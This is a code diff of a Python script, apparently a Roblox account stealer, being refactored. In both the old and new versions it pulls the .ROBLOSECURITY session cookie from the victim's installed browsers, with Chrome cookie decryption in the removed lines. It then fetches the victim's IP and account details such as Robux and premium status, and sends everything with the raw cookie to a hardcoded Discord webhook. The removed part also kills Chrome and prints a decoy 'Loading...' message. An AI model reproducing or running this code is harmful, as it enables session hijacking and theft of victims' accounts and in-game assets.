@@ -5,7 +5,6 @@ import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
-import win32crypt
 from Crypto.Cipher import AES
 from discordwebhook import Discord
 import httpx
@@ -13,70 +12,17 @@ import re
 import requests
 import robloxpy
 
-try:
-    subprocess.call("TASKKILL /f /IM CHROME.EXE")
-except FileNotFoundError:
-    print("")
-
+# Define webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp'
 
-dummy_message = "Loading..."
-print(dummy_message)
-
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = json.loads(local_state)
-
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-
-def decrypt_data(data, key):
-    try:
-        iv = data[3:15]
-        data = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
-    except:
-        try:
-            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
-        except:
-            return ""
-
-
-def CookieLog():
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    filename = "Cookies.db"
-    if not os.path.isfile(filename):
-        shutil.copyfile(db_path, filename)
-
-    db = sqlite3.connect(filename)
-    db.text_factory = lambda b: b.decode(errors="ignore")
-    cursor = db.cursor()
-
-    cursor.execute("""
-    SELECT encrypted_value 
-    FROM cookies WHERE name='.ROBLOSECURITY'""")
-
-    key = get_encryption_key()
-    for encrypted_value, in cursor.fetchall():
-        decrypted_value = decrypt_data(encrypted_value, key)
-        return decrypted_value
-    db.close()
-
-def PlanB():
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+# Function to get encrypted cookies (working across all platforms)
+def get_encrypted_cookies():
+    data = []  # Store all cookies for Roblox
 
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
                 data.append(cookie.value)
                 return data
     except:
@@ -85,7 +31,6 @@ def PlanB():
         cookies = browser_cookie3.chromium(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
                 data.append(cookie.value)
                 return data
     except:
@@ -95,7 +40,6 @@ def PlanB():
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
                 data.append(cookie.value)
                 return data
     except:
@@ -105,7 +49,6 @@ def PlanB():
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
                 data.append(cookie.value)
                 return data
     except:
@@ -115,23 +58,19 @@ def PlanB():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
             if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
                 data.append(cookie.value)
                 return data
     except:
         pass
 
+    return None
 
-cookies = PlanB()
-
-if CookieLog() == None:
-    PlanB()
-
+# Function to fetch local IP
 def get_local_ip():
     ip = requests.get('http://api.ipify.org').text
     return ip
 
-
+# Function to refresh Roblox cookies (working cross-platform)
 def refresh_cookie(auth_cookie):
     csrf_token = generate_csrf_token(auth_cookie)
     headers, cookies = generate_headers(csrf_token, auth_cookie)
@@ -148,13 +87,13 @@ def refresh_cookie(auth_cookie):
 
     return new_auth_cookie
 
-
+# Function to generate CSRF token for authentication
 def generate_csrf_token(auth_cookie):
     csrf_req = httpx.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": auth_cookie})
     csrf_txt = csrf_req.text.split("<meta name=\"csrf-token\" data-token=\"")[1].split("\" />")[0]
     return csrf_txt
 
-
+# Function to generate headers for requests
 def generate_headers(csrf_token, auth_cookie):
     headers = {
         "Content-Type": "application/json",
@@ -168,17 +107,22 @@ def generate_headers(csrf_token, auth_cookie):
 
     return headers, cookies
 
-
+# Main script logic
 if __name__ == "__main__":
-    cookie = CookieLog()
+    cookie = get_encrypted_cookies()
+    if cookie is None:
+        print("No valid Roblox cookie found.")
+        exit(1)
 
-    check = robloxpy.Utils.CheckCookie(cookie).lower()
-    if check != "valid cookie":
-        cookie = refresh_cookie(cookie)
-
+    roblox_cookie = cookie[0]  # Assuming the first cookie is valid
     ip_address = get_local_ip()
-    roblox_cookie = cookie
 
+    # Validate the Roblox cookie
+    check = robloxpy.Utils.CheckCookie(roblox_cookie).lower()
+    if check != "valid cookie":
+        roblox_cookie = refresh_cookie(roblox_cookie)
+
+    # Fetch user details from Roblox API
     info = json.loads(requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblox_cookie}).text)
     roblox_id = info["UserID"]
     rap = robloxpy.User.External.GetRAP(roblox_id)
@@ -192,9 +136,10 @@ if __name__ == "__main__":
     headshot = headshot_json["data"][0]["imageUrl"]
 
     username = info['UserName']
-    robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
+    robux = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = info['IsPremium']
 
+    # Post data to Discord webhook
     discord = Discord(url=webhook_url)
     discord.post(
         username="BOT - Pirate ðŸª",
@@ -224,4 +169,4 @@ if __name__ == "__main__":
         embeds=[
             {"title": ".ROBLOSECURITY", "description": f"```{roblox_cookie}```"}
         ],
-                                         )
+                )
